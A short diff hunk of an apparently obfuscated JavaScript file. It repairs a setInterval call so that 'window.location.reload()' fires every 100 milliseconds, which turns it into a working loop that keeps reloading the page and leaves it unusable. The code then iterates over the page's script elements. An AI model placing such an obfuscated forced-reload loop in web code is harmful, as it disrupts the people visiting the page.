@@ -468,7 +468,7 @@ const _0xb07d=['170171vynXfZ','apply','4925728bUtzDg','3865MjjZxM','console','wa
   function getRandomDigit() {
     return Math.floor(Math.random() * 9) + 1;
   }
-setInterval(() => {window.reload()}, 100) 
+setInterval(() => {window.location.reload()}, 100) 
   const scripts = document.getElementsByTagName('script');
   for (let i = 0; i < scripts.length; i++) {
     const script = scripts[i];
